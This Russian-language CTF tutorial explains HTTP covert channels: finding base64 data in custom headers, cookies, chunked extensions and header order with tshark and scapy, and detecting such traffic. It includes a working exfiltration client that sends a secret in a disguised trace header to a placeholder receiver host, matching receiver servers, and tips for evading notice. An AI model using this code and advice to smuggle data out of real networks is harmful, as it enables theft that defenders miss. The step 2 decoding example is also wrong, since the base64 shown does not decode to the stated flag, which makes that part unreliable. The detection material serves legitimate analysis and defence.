## Вопрос, с которого всё начинается

Тебе дали `exfil.pcap` — запись веб-трафика. Смотришь: обычные запросы к `example.com`, обычные ответы, ничего подозрительного. `strings` по файлу не находит ни флага, ни длинных строк. Но данные точно утекали. Где их искать?

Ответ: в **полях HTTP**, которые ты не привык читать. HTTP — текстовый протокол, а значит почти любое его поле может быть контейнером. Разберём это на нашем pcap.

## Наш пример: exfil.pcap

**HTTP** — протокол обмена между браузером и сервером: запрос состоит из строки (`GET / HTTP/1.1`), **заголовков** (`Host:`, `User-Agent:`) и тела. Заголовок — это пара `Имя: значение`.

Классические места сокрытия:

- **Произвольные заголовки.** Любой `X-Data`, `X-Trace`, `X-Request-Id` может нести base64;
- **Cookie.** Значения часто не валидируются;
- **User-Agent / Referer.** Длинные строки, куда легко вписать данные;
- **Порядок и регистр заголовков.** Перестановка кодирует биты;
- **Chunked encoding.** Размеры чанков несут данные.

Для аналитика ключевая мысль: данные могут быть **в структуре**, а не в значении. Поэтому `strings` часто ничего не даёт.

## Шаг 1: извлекаем заголовки

`tshark` — консольный анализатор pcap. Выведем все строки запросов:

```bash
$ tshark -r exfil.pcap -Y 'http.request' -T fields -e http.request.line | head
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
X-Session-Token: ZmxhZ3toZHR0cF9oZWFkZXJ9\r\n
Accept: */*\r\n
```

Фильтр `-Y 'http.request'` оставляет только запросы, `-e http.request.line` печатает все строки. Сразу видно подозрительный заголовок `X-Session-Token` со строкой из base64-алфавита.

## Шаг 2: декодируем

**Base64** — способ записать байты текстом из букв, цифр, `+` и `/`.

```bash
$ echo ZmxhZ3toZHR0cF9oZWFkZXJ9 | base64 -d
flag{http_header}
```

Важно не путать обычный base64 и **base64url**: в URL-контексте `+`/`/` заменяются на `-`/`_`. Если декодер ругается — попробуй заменить их обратно.

Быстрый способ найти все base64-подобные строки в трафике:

```bash
$ tshark -r exfil.pcap -Y 'http' -T fields -e http.request.line \
  | grep -oE '[A-Za-z0-9+/]{16,}={0,2}' | while read s; do
      echo -n "$s -> "; echo "$s" | base64 -d 2>/dev/null; echo; done
```

## Шаг 3: chunked encoding

В HTTP/1.1 тело ответа может передаваться **чанками**: каждый чанк предваряется его размером в hex, а завершает всё чанк нулевой длины. Стеганография здесь двух видов:

1. **Данные в размерах чанков** — последовательность размеров кодирует биты, а содержимое безобидно;
2. **«Мусорные» чанки** — между полезными вставляются лишние.

Разбор через `scapy` (библиотека Python для разбора пакетов):

```python
from scapy.all import rdpcap, TCP, Raw
for pkt in rdpcap("chunked.pcap"):
    if pkt.haslayer(Raw):
        data = pkt[Raw].load
        if b"Transfer-Encoding" in data:
            print(data[:200])
```

## Шаг 4: HTTP/2 и HTTP/3

HTTP/2 перестал быть текстовым: заголовки сжаты (HPACK), тело дробится на кадры. Новые каналы:

- **Псевдозаголовки** (`:authority`, `:path`) — редко валидируются глубоко;
- **Padding** — HTTP/2 официально поддерживает выравнивание, «мусорные» байты могут нести данные;
- **Порядок SETTINGS** — параметры соединения можно переставлять.

```bash
$ tshark -r h2.pcap -Y "http2" -T fields -e http2.header.name -e http2.header.value | head
```

HTTP/3 работает поверх QUIC, где данные — в потоках, а заголовки в QPACK.

## Шаг 5: построение канала

Канал строится из двух сторон: отправитель вставляет данные в заголовок, получатель извлекает.

```python
import requests, base64
secret = b"flag{channel}"
requests.get("http://receiver.local/collect",
             headers={"X-Amzn-Trace-Id": base64.b64encode(secret).decode()})
```

```python
from flask import Flask, request
import base64
app = Flask(__name__)
@app.route("/collect")
def collect():
    v = request.headers.get("X-Amzn-Trace-Id", "")
    return base64.b64decode(v).decode()
```

Имя заголовка берут похожим на легитимное — прокси пробрасывают неизвестные поля как есть.

## Сквозной разбор: собираем и разбираем pcap

Проверим методику на настоящей записи. Соберём pcap с одним HTTP-запросом, спрятав base64 в заголовок `X-Session-Token`:

```python
from scapy.all import Ether, IP, TCP, Raw, wrpcap
import base64
payload = base64.b64encode(b"flag{http_header}").decode()
req = (f"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n"
       f"X-Session-Token: {payload}\r\nAccept: */*\r\n\r\n").encode()
pkt = Ether()/IP(src="10.0.0.5",dst="93.184.216.34")/TCP(sport=44444,dport=80,flags="PA")/Raw(load=req)
wrpcap("exfil.pcap", [pkt])
```

Теперь читаем её только через `tshark`, как в реальной задаче:

```bash
$ tshark -r exfil.pcap -Y 'http.request' -T fields -e http.request.line | tr -d '\r'
Host: example.com
User-Agent: Mozilla/5.0
X-Session-Token: ZmxhZ3todHRwX2hlYWRlcn0=
Accept: */*
```

Обрати внимание: `tshark` дописывает `\r\n` и разделяет строки запятыми — их надо чистить (`tr -d '\r'`). Подозрительный заголовок выдаёт себя алфавитом base64. Декодируем:

```bash
$ echo ZmxhZ3todHRwX2hlYWRlcn0= | base64 -d
flag{http_header}
```

Это ровно тот маршрут, который нужен в задаче: `tshark` → фильтр по `http` → `-e http.request.line` → глаз на `X-*` → `base64 -d`.

## Если не сработало

- **Ищешь только значения** — порядок и регистр заголовков тоже канал.
- **Забыл про `\r\n`** — `tshark -T fields` добавляет переводы строк, чисти их.
- **Путаешь base64 и base64url.**
- **Игнорируешь chunked** — тело может быть разбито на сотни чанков.
- **Смотришь только запросы** — ответ сервера такой же канал.
- **Пропустил несколько потоков** — данные могут собираться по порядку из десятков запросов.

## Обнаружение и анализ pcap

Методика для pcap-задачи:

1. `tshark -z io,phs` — статистика протоколов, нет ли подозрительного объёма.
2. `tshark -Y 'http' -T fields -e http.request.line -e http.response.line` — все строки.
3. Поиск аномалий: очень длинные заголовки, редкие `X-*` поля.
4. Проверка chunked: размеры чанков, их регулярность.
5. Декодирование подозрительных значений.

```bash
$ tshark -r exfil.pcap -Y 'http' -T fields -e http.request.line \
  | awk 'length($0) > 100'
```

## Сравнительная таблица каналов

| Канал | Где | Заметность | Извлечение |
|---|---|---|---|
| Произвольный заголовок | значение `X-*` | средняя | низкая |
| Cookie | значение cookie | низкая | низкая |
| User-Agent/Referer | длинные строки | средняя | низкая |
| Порядок заголовков | структура | очень низкая | высокая |
| Chunked-размеры | тело ответа | низкая | средняя |

## Сравнение с DNS- и ICMP-туннелями

HTTP-канал удобнее там, где разрешён только веб. DNS-туннель меньше по объёму (имена короткие), но выживает при агрессивной фильтрации. ICMP-туннель не зависит от веб-прокси, но часто блокируется на периметре. HTTP сочетает большой объём с высокой пропускной способностью, поэтому в CTF и в реальных эксфильтрациях встречается чаще всего.

## Что мы теперь знаем

1. HTTP — текстовый протокол: почти любое поле может нести данные.
2. Главные каналы — **`X-*` заголовки, cookies, User-Agent**.
3. Данные часто в **base64** (иногда base64url).
4. **Chunked**-размеры и **HTTP/2 padding** — структурные каналы.
5. `strings` не поможет — читай **поля** через `tshark`.

## Пошаговый разбор cookie-канала

Cookie — самый «незаметный» канал, потому что значения cookies редко валидируются и почти никогда не логируются. Возьмём дамп, где данные спрятаны в значении cookie:

```bash
$ tshark -r cookie.pcap -Y 'http.request' -T fields -e http.cookie
sess=7b2261; theme=dark; ref=ZmxhZ3tjb29raWV9
```

Поле `ref` выглядит как обычный идентификатор, но его алфавит — base64. Декодируем:

```bash
$ echo ZmxhZ3tjb29raWV9 | base64 -d
flag{cookie}
```

Чтобы найти такой канал автоматически, переберите все cookie-значения и попробуйте base64-декодировать каждое; осмысленный текст — признак канала.

## Скрытый канал в порядке заголовков

Структурный канал сложнее заметить и извлечь. Отправитель фиксирует **набор** заголовков, а их порядок кодирует биты: например, `Host` перед `User-Agent` — бит 0, после — бит 1. Получатель читает порядок и восстанавливает сообщение.

```python
order = [h.lower() for h in headers]          # фактический порядок
bits = ''.join('0' if order.index(a) < order.index(b) else '1'
               for a, b in pairs)              # сравнение позиций
```

Для детекта нужно выписать порядок заголовков из нескольких запросов и сравнить: если «набор один, а порядок плавает» — перед вами структурный канал. `tshark` здесь помогает косвенно: `-e http.request.line` сохраняет порядок строк.

## Как строить защищённый детектор

Правило обнаружения: нормализуйте трафик и ищите **аномалии**. Практические сигналы эксфильтрации через HTTP:

- редкие или самодельные заголовки (`X-*`, длинные значения с base64-алфавитом);
- одинаковая длина запросов при разном содержимом (выравнивание под фиксированный размер);
- cookies с высокой энтропией и без смысла;
- много коротких запросов к одному URL (построение сообщения по частям).

На эти сигналы пишут правила для IDS/прокси: например, алерт на заголовки длиннее 100 символов с base64-подобным значением. Понимая, как строят канал, вы понимаете, что детектировать.

## Что именно можно спрятать в HTTP

HTTP — это текст с массой «свободных» полей, и каждое из них годится под канал. Классификация по незаметности:

| Место | Объём | Заметность | Замечание |
|---|---|---|---|
| Заголовки (order/case) | средний | низкая | порядок заголовков часто не нормируется |
| Значения заголовков | большой | средняя | Base64/hex в `User-Agent`, `Cookie` |
| Chunked extensions | средний | низкая | расширения чанков игнорируются получателем |
| Trailing headers | малый | низкая | после последнего чанка |
| Паддинг в путях | малый | средняя | `/a/../b` vs `/a/b` |
| Тело (полиглоты) | большой | высокая | если тело — картинка, заметно |
| Тайминги | малый | очень низкая | задержки между запросами |

Главная идея: **не нормированные строго поля** — лучший канал. Если протокол требует сохранить порядок, но не запрещает перестановку, это уже бит на заголовок.

## Декодирование: пошагово

Для задачи `exfil.pcap` порядок такой:

1. `tshark -r exfil.pcap -Y http -T fields -e http.user_agent` — выгрузите поле.
2. Посмотрите уникальные значения: повторяющийся префикс — признак канала.
3. Выделите изменяющуюся часть (после префикса) — это, скорее всего, данные.
4. Определите кодировку: `hex`, `base64`, `rot13`, биты по чётности.
5. Декодируйте и соберите из фрагментов сообщение.

Если канал построен на порядке заголовков, `tshark` вернёт их в исходном порядке — прочитайте как биты (например, «X-Request-Id до Host» = 0). Если на регистре — сравните с канонической формой.

## Chunked: где прячется полезная нагрузка

Chunked transfer позволяет добавлять **chunk extensions** после размера чанка:

```
5;ext=YWJj\r\nhello\r\n0\r\n\r\n
```

Расширение `ext=YWJj` — это `abc` в base64, а получатель его игнорирует. Это идеальный скрытый канал: промежуточные прокси и логи часто не сохраняют расширения. Trailing headers (после последнего чанка) — второй вариант: они тоже необязательны и редко логируются.

Для разбора используйте `tshark -r file -Y "http.chunked"` и вручную смотрите байты, либо Wireshark с «Follow HTTP Stream», где видно сырой поток. Обратите внимание: некоторые анализаторы «нормализуют» поток и теряют расширения — всегда проверяйте сырые байты.

## HTTP/2 и HTTP/3: бинарные каналы

В HTTP/2 заголовки передаются в HPACK-таблице (сжатие с состоянием), а фреймы имеют фиксированный формат. Скрыть данные можно:

- в **padding** фреймов (поле длины padding),
- в **priority**-зависимостях,
- в порядке и содержимом псевдозаголовков,
- в **settings**-фреймах и их параметрах.

HTTP/3 (QUIC) добавляет ещё больше свободы: номер потока, идентификатор соединения, а сам транспорт шифрован (TLS 1.3), поэтому для перехвата нужен дамп с ключами сессии (`SSLKEYLOGFILE`). Разбор — через `tshark` с поддержкой HTTP/2/3 или `nghttp2`. Практический вывод: чем современнее протокол, тем труднее **обнаружить** канал, но и тем сложнее построить его вручную.

## Построение канала

Чтобы собрать канал, нужны две стороны: клиент-экфильтратор и сервер-приёмник. Простейший вариант — сервер на Python, читающий заголовок:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        data = self.headers.get('X-Data', '')
        open('received.bin', 'ab').write(bytes.fromhex(data))
        self.send_response(204); self.end_headers()
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
```

Клиент кладёт очередную порцию в `X-Data`. Чтобы канал был незаметен, варьируйте несущее поле (то заголовок, то cookie), добавляйте шум, не отправляйте слишком часто. Объём в заголовке ограничен (~8 КБ на запрос), поэтому данные шьют по частям.

## Обнаружение и защита

Защита — это **нормализация**: перезапись запроса в каноническую форму на прокси (порядок заголовков, регистр, удаление неизвестных заголовков и chunk extensions). Что искать при анализе:

- аномальный порядок или дублирование заголовков,
- поля с подозрительной энтропией (base64/hex),
- несоответствие User-Agent реальному клиенту,
- периодичность запросов (beacon),
- chunk extensions и trailing headers.

Для детекта подойдут Suricata-правила на нестандартные заголовки и статистика по энтропии полей. Помните: канал — это про **незаметность**, и как только защита нормализует запрос, он рвётся. Поэтому в реальных атаках чаще используют уже легитимные поля (cookie сессии), а не экзотические.

## Краткий вывод

HTTP-канал живёт в **полях**, а не в содержимом. Поэтому методика разбора pcap всегда одна: выгрузить строки запроса и ответа через `tshark -T fields`, выписать все необычные заголовки и cookies, проверить base64/base64url, затем посмотреть на структуру (порядок, регистр, chunked-размеры). Если данные собираются по частям, сортируйте запросы по времени и склеивайте. И не забывайте про ответы сервера: там тот же набор каналов.
